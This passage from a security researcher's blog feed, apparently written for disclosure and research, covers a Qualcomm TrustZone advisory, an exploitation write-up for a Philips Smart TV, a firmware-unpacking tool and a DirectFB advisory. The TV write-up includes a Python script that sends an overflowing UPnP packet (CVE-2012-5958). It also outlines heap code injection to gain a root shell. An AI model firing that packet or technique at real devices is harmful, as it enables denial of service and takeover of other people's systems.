&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;FE852B94&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="no"&gt;subfunc_1&lt;/span&gt;
&lt;span class="nf"&gt;FE852B94&lt;/span&gt;     &lt;span class="no"&gt;CMP&lt;/span&gt;      &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#2&lt;/span&gt;
&lt;span class="nf"&gt;FE852B96&lt;/span&gt;     &lt;span class="no"&gt;BCS&lt;/span&gt;      &lt;span class="no"&gt;loc_FE852BBA&lt;/span&gt; &lt;span class="c1"&gt;;unsigned comparison: branch if R0 &amp;gt; 1&lt;/span&gt;
&lt;span class="nf"&gt;FE852B98&lt;/span&gt;     &lt;span class="no"&gt;MOVW&lt;/span&gt;     &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x9F38&lt;/span&gt;
&lt;span class="nf"&gt;FE852B9C&lt;/span&gt;     &lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;The bug can no longer be
triggered.&lt;/div&gt;

&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;p&gt;Access Vector: Local&lt;/p&gt;
&lt;p&gt;Access Complexity: High&lt;/p&gt;
&lt;p&gt;Authentication: Single&lt;/p&gt;
&lt;p&gt;Confidentiality Impact: Complete&lt;/p&gt;
&lt;p&gt;Integrity Impact: Complete&lt;/p&gt;
&lt;p&gt;Availability Impact: Complete&lt;/p&gt;
&lt;h2&gt;Disclosure Timeline&lt;/h2&gt;

&lt;p&gt;2014-08-28 Intial vendor notification&lt;/p&gt;
&lt;p&gt;2014-09-03 Vendor reply; severity of the issue rated as high&lt;/p&gt;
&lt;p&gt;2014-00-00 Vendor has notified all OEMs&lt;/p&gt;
&lt;p&gt;2014-12-18 Public advisory&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;References:&lt;/span&gt;&lt;br&gt;
&lt;span style="white-space: pre;"&gt;&lt;a href=
"https://www.qualcomm.com/connect/contact/security/product-security/hall-of-fame"&gt;
https://www.qualcomm.com/connect/contact/security/product-security/hall-of-fame&lt;/a&gt;&lt;/span&gt;&lt;br&gt;&lt;/p&gt;
&lt;hr&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="arm"></category><category term="security"></category><category term="qualcomm"></category><category term="android"></category><category term="trustzone"></category></entry><entry><title>Exploitation of Philips Smart TV</title><link href="https://fredericb.info/2014/11/exploitation-of-philips-smart-tv.html" rel="alternate"></link><published>2014-11-13T13:29:00-08:00</published><updated>2014-11-13T13:29:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-11-13:/2014/11/exploitation-of-philips-smart-tv.html</id><summary type="html">&lt;p&gt;&lt;em&gt;This post is a translated summary of the article published for &lt;a href=
"https://www.sstic.org/2014/presentation/securite_des_ordivisions/"&gt;
my talk at SSTIC 2014 conference (french)&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;My Philips Smart TV is a Linux box standing there in my living room : that's a sufficient reason
to try to get root.
&lt;h2 style="text-align: justify;"&gt;Debug serial port&lt;/h2&gt;
&lt;div style="text-align: justify;"&gt;Internet hackers have already
discovered a …&lt;/div&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;em&gt;This post is a translated summary of the article published for &lt;a href=
"https://www.sstic.org/2014/presentation/securite_des_ordivisions/"&gt;
my talk at SSTIC 2014 conference (french)&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;My Philips Smart TV is a Linux box standing there in my living room : that's a sufficient reason
to try to get root.
&lt;h2 style="text-align: justify;"&gt;Debug serial port&lt;/h2&gt;
&lt;div style="text-align: justify;"&gt;Internet hackers have already
discovered a serial port on the back panel of the TV set.&lt;/div&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr &gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/smarttv/uart.jpg" width="256px"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;Serial port
(Jack plug)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
This port gives a lot of technical information on the system :&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Linux version 2.6.28.9-oslinuxR7.5
(root@lxdevenv) (gcc version 4.2.4) #1 Thu Jun 16 23:27:36 CEST 2011
console [early0] enabled
CPU revision is: 00019651 (MIPS 24Kc)
FPU revision is: 01739300
282 MB SDRAM allocated to Linux on MIPS
512 MB total SDRAM size
Endianess : LITTLE
[...]
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;UPnP library identification&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;A network scan reports a running
UPnP service. In January 2013, Rapid7 discovered many
vulnerabilities in libupnp library, v1.6.18. To check if the device
is vulnerable, we send a simple UDP packet that can trigger one of
them (CVE-2012-5958):&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
&lt;span class="n"&gt;pkt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NOTIFY * HTTP/1.1&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;\
   &lt;span class="s2"&gt;&amp;quot;HOST: 239.255.255.250:1900&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;\
   &lt;span class="s2"&gt;&amp;quot;USN:uuid:schemas:device:&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;\
   &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;512&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;:end&lt;/span&gt;&lt;span class="se"&gt;\r\n\r\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendto&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pkt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;239.255.255.250&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1900&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;We can see in the console that a
crash occurred:&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;03 &amp;lt;2&amp;gt; 001990235 Exception in process 443: SIGSEGV: address not mapped to object
03 &amp;lt;2&amp;gt; 001990235 EPC = 0x41414141
03 &amp;lt;2&amp;gt; 001990235 RA = 0x41414141
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Execution flow has been
redirected to an arbitrary address, so we know this device uses a
vulnerable version of libupnp. Moreover, it indicates there's no
stack-smashing protection.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;&lt;br&gt;&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;In these conditions, exploitation
could be easy if we had had access to this binary&amp;nbsp;or loaded
shared libraries.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;But it's not the case: firmware
updates are encrypted, and there's no public method to get a shell
on this system, at this time.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Unfortunately, the &lt;a href=
"http://sitsec.net/blog/2013/09/16/jointspace-server-directory-traversal-vulnerability-on-a-philips-6000-series-smart-led-tv/"&gt;
path traversal vulnerability found by Martin Schobert&lt;/a&gt; is not
present in our firmware.&lt;/div&gt;

&lt;h2&gt;Memory mapping discovery&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;CVE-2012-5958 is a remote stack
overflow in the "unique_server_name" function. We cross-compile the
same version of libupnp used in the TV set (1.4), for the same
architecture (MIPS32) with the same compiler (GCC 4.2.4).&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Then we disassemble the
vulnerable function :&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="na"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D4C&lt;/span&gt;                &lt;span class="no"&gt;lw&lt;/span&gt;      &lt;span class="no"&gt;$ra&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x158&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D50&lt;/span&gt;                &lt;span class="no"&gt;lw&lt;/span&gt;      &lt;span class="no"&gt;$s3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x154&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D54&lt;/span&gt;                &lt;span class="no"&gt;lw&lt;/span&gt;      &lt;span class="no"&gt;$s2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x150&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D58&lt;/span&gt;                &lt;span class="no"&gt;lw&lt;/span&gt;      &lt;span class="no"&gt;$s1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x14C&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D5C&lt;/span&gt;                &lt;span class="no"&gt;lw&lt;/span&gt;      &lt;span class="no"&gt;$s0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x148&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D60&lt;/span&gt;                &lt;span class="no"&gt;jr&lt;/span&gt;      &lt;span class="no"&gt;$ra&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D64&lt;/span&gt;                &lt;span class="no"&gt;addiu&lt;/span&gt;   &lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x160&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;D64&lt;/span&gt;  &lt;span class="c1"&gt;# End of function unique_service_name&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Function epilogue restores 4
registers (plus $ra) before returning to calling function. The
stack overflow allows to overwrite them with almost arbitrary
values (there's a lot of forbidden bytes).&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;&lt;br&gt;&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Among functions that call
"unique_server_name", the "ssdp_request_type" function uses
registers $s0 &amp; $s1 right after the call return.&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DB4&lt;/span&gt;                 &lt;span class="no"&gt;jalr&lt;/span&gt;    &lt;span class="no"&gt;$t9&lt;/span&gt; &lt;span class="c1"&gt;; unique_service_name&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DB8&lt;/span&gt;                 &lt;span class="no"&gt;move&lt;/span&gt;    &lt;span class="no"&gt;$a1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;$s0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DBC&lt;/span&gt;                 &lt;span class="no"&gt;lw&lt;/span&gt;      &lt;span class="no"&gt;$gp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x28&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;saved_gp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$sp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DC0&lt;/span&gt;                 &lt;span class="no"&gt;move&lt;/span&gt;    &lt;span class="no"&gt;$a0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;$s1&lt;/span&gt; &lt;span class="c1"&gt;; arg0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DC4&lt;/span&gt;                 &lt;span class="no"&gt;la&lt;/span&gt;      &lt;span class="no"&gt;$t9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0x49C0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DC8&lt;/span&gt;                 &lt;span class="no"&gt;or&lt;/span&gt;      &lt;span class="no"&gt;$at&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;$zero&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DCC&lt;/span&gt;                 &lt;span class="no"&gt;jalr&lt;/span&gt;    &lt;span class="no"&gt;$t9&lt;/span&gt; &lt;span class="c1"&gt;; ssdp_request_type1&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;00004&lt;/span&gt;&lt;span class="nf"&gt;DD0&lt;/span&gt;                 &lt;span class="no"&gt;sw&lt;/span&gt;      &lt;span class="no"&gt;$zero&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;$s0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;; write 0 @ $s0+8&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Register $s1 is passed as
parameter to the function "ssdp_request_type1", which reads it as a
string pointer.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Register $s0 is dereferenced to
write the null value.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;After that, these registers are
not used anymore until the end of the function where they'll be
restored.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;&lt;br&gt;&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Overwriting saved values of one
of these registers $s0, $s1 and $ra with an arbitrary memory
address can lead to crash the process if this address is not
mapped, or respectively not writable, readable, or
executable.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;&lt;br&gt;&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Crashes can be detected in many
ways:&lt;/div&gt;

&lt;ul&gt;
&lt;li style="text-align: justify;"&gt;denial of service : the process
doesn't answer anymore to UPnP requests&lt;/li&gt;
&lt;li style="text-align: justify;"&gt;specific network activity : the
process broadcasts specific packets at startup&lt;/li&gt;
&lt;li style="text-align: justify;"&gt;crash reports on serial port: from
far the handiest method&lt;/li&gt;
&lt;/ul&gt;

&lt;div style="text-align: justify;"&gt;The observation of process'
behavior allows to deduce if an address is mapped and its
associated permissions.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;&lt;br&gt;&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;By repeating this task in an
automated way, it's possible to discover a part of process' memory
mapping :&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0x00402020-0x00532120   r-x
0x00542020-0x0091af20   rw-
0x0091b020-0x00927efc   ---
0x00928020-0x00930920   rw-
0x00942920-0x00980920+  rwx
&lt;/pre&gt;&lt;/div&gt;


&lt;div style="text-align: justify;"&gt;Stability of results indicates
that these memory regions are not randomized. We can see that last
one is a variable-sized executable area. We make the hypothesis
this area is the heap.&lt;/div&gt;

&lt;h2&gt;Injecting arbitrary code&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;We assume that heap is
executable. As libupnp library is open source, we know how UPnP
packets are handled, and which ones are stored in heap
memory.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;Thus, we send a custom UPnP
packet to put our arbitrary code at an unknown address in the heap.
No memory corruption involved here.&lt;/div&gt;

&lt;h2&gt;Finding arbitrary code location&lt;/h2&gt;

&lt;div style="text-align: justify;"&gt;As we've already said, this stack
overflow allows to arbitrary modify 4 registers ($s0-3) before
returning from the vulnerable function. Right after,
"ssdp_request_type1" function is called with a single argument $a0
copied from $s1, so we can choose its value.&lt;/div&gt;

&lt;div style="text-align: justify;"&gt;This function uses its unique
argument as a string pointer and checks if it contains some static
substrings.&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;enum&lt;/span&gt; &lt;span class="n"&gt;SsdpSearchType&lt;/span&gt; &lt;span class="n"&gt;ssdp_request_type1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;IN&lt;/span&gt; &lt;span class="n"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;strstr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;:all&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;NULL&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;SSDP_ALL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;SSDP_SERROR&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If at least one static substrings
is found in the string pointer, the UPnP process will respond to
our request. This behavior lets us know if an arbitrary string
pointer contains a specific substring.&lt;br&gt;
&lt;br&gt;
So we put one of these substrings (":all" for example) in our
arbitrary code, and we use this behavior to search its address in
the heap area (we've already discovered heap start address in a
previous section)&lt;br&gt;
As we need to send many UPnP packets and to monitor responses, this
process takes few minutes.&lt;/p&gt;
&lt;h2&gt;Remote arbitrary code execution&lt;/h2&gt;

&lt;p&gt;We are able to put our arbitrary code in heap memory (executable),
find out its address, and execute it. Thereby, we get shell access
to this system.
We can notice that :&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;all processes are root&lt;/li&gt;
&lt;li&gt;stack and heap are executable&lt;/li&gt;
&lt;li&gt;stack is not randomized&lt;/li&gt;
&lt;/ul&gt;
We can also extract &lt;strike&gt;private&lt;/strike&gt; public [0] RSA key to
decrypt firmware updates with &lt;a href="https://fredericb.info/2014/05/pflupg-tool-unpack-philips-smarttv.html"&gt;pflupg-tool&lt;/a&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;[0] Edit 2014/11/14 : Thanks andreashappe for pointing out this
mistake.&lt;/p&gt;</content><category term="mips"></category><category term="smarttv"></category><category term="libupnp"></category><category term="philips"></category><category term="exploit"></category></entry><entry><title>pflupg-tool : unpack Philips SmartTV firmware</title><link href="https://fredericb.info/2014/05/pflupg-tool-unpack-philips-smarttv.html" rel="alternate"></link><published>2014-05-16T07:28:00-07:00</published><updated>2014-05-16T07:28:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-05-16:/2014/05/pflupg-tool-unpack-philips-smarttv.html</id><summary type="html">&lt;p&gt;&lt;a href="https://github.com/frederic/pflupg-tool"&gt;pflupg-tool&lt;/a&gt; is an
unpacking tool for Philips SmartTV firmware (Fusion platform). If
your firmware is encrypted, you have to provide the corresponding
public key (public exponent&amp;nbsp;+ modulus).&lt;br&gt;
&lt;br&gt;
You can add public keys in pflupg.h file:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define PUBLIC_KEYS_CNT 2&lt;/span&gt;
&lt;span class="c1"&gt;// { name, public exponent e (hex string), modulus n (hex string)}&lt;/span&gt;
&lt;span class="k"&gt;static …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;&lt;a href="https://github.com/frederic/pflupg-tool"&gt;pflupg-tool&lt;/a&gt; is an
unpacking tool for Philips SmartTV firmware (Fusion platform). If
your firmware is encrypted, you have to provide the corresponding
public key (public exponent&amp;nbsp;+ modulus).&lt;br&gt;
&lt;br&gt;
You can add public keys in pflupg.h file:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define PUBLIC_KEYS_CNT 2&lt;/span&gt;
&lt;span class="c1"&gt;// { name, public exponent e (hex string), modulus n (hex string)}&lt;/span&gt;
&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;public_keys&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;PUBLIC_KEYS_CNT&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;my_key_1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;010001&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;AABBCCDD&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;
 &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;my_key_2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;010001&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;010E020F&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Usage: ./pflupg &amp;lt;upg_filename&amp;gt; [key_name]
2 keys available :
* my_key_1
* my_key_2
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Source code can be found on &lt;a href=
"https://github.com/frederic/pflupg-tool"&gt;GitHub&lt;/a&gt;. You'll need
&lt;a href="https://www.gnu.org/software/libgcrypt/"&gt;Libgcrypt
library&lt;/a&gt;&amp;nbsp;to compile it.&lt;/p&gt;</content><category term="mips"></category><category term="smarttv"></category><category term="firmware"></category><category term="philips"></category></entry><entry><title>[CVE-2014-2978] DirectFB remote out-of-bounds write vulnerability</title><link href="https://fredericb.info/2014/05/cve-2014-2978-directfb-remote-out-of.html" rel="alternate"></link><published>2014-05-15T16:09:00-07:00</published><updated>2014-05-15T16:09:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2014-05-15:/2014/05/cve-2014-2978-directfb-remote-out-of.html</id><summary type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;DirectFB is prone to an out-of-bound write vulnerability since version
1.4.4.&lt;/p&gt;
&lt;p&gt;The vulnerability can be triggered remotely without authentication
through Voodoo interface (network layer of DirectFB).
&lt;h2&gt;Details&lt;/h2&gt;
An attacker can choose to overflow in the heap or the stack.&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;DirectFB is prone to an out-of-bound write vulnerability since version
1.4.4.&lt;/p&gt;
&lt;p&gt;The vulnerability can be triggered remotely without authentication
through Voodoo interface (network layer of DirectFB).
&lt;h2&gt;Details&lt;/h2&gt;
An attacker can choose to overflow in the heap or the stack.&lt;/p&gt;
&lt;h2&gt;CVSS Version 2 Metrics&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Access Vector: Network exploitable&lt;/li&gt;
&lt;li&gt;Access Complexity: Low&lt;/li&gt;
&lt;li&gt;Authentication: None&lt;/li&gt;
&lt;li&gt;Confidentiality Impact: Complete&lt;/li&gt;
&lt;li&gt;Integrity Impact: Complete&lt;/li&gt;
&lt;li&gt;Availability Impact: Complete&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;2014-03-27 Developer notified&lt;/li&gt;
&lt;li&gt;2014-04-21 CVE-2014-2978 assigned&lt;/li&gt;
&lt;li&gt;2014-05-16 Public advisory&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;http://www.directfb.org/&lt;/li&gt;
&lt;li&gt;http://mail.directfb.org/pipermail/directfb-dev/2014-March/006805.html&lt;/li&gt;
